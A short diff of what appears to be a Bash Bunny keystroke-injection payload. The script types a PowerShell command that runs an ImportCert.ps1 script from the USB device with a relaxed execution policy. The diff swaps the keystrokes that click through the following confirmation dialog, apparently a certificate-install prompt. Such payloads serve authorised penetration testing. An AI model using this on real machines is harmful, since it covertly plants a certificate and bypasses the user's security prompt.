@@ -51,7 +51,8 @@ Q DELAY 500
 Q STRING powershell -ExecutionPolicy RemoteSigned ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\ImportCert.ps1')"
 Q ENTER
 Q DELAY 1000
-Q ALT y
+Q TAB SHIFT
+Q TAB ENTER
 Q DELAY 500
 
 #Unmount the USB Drive.
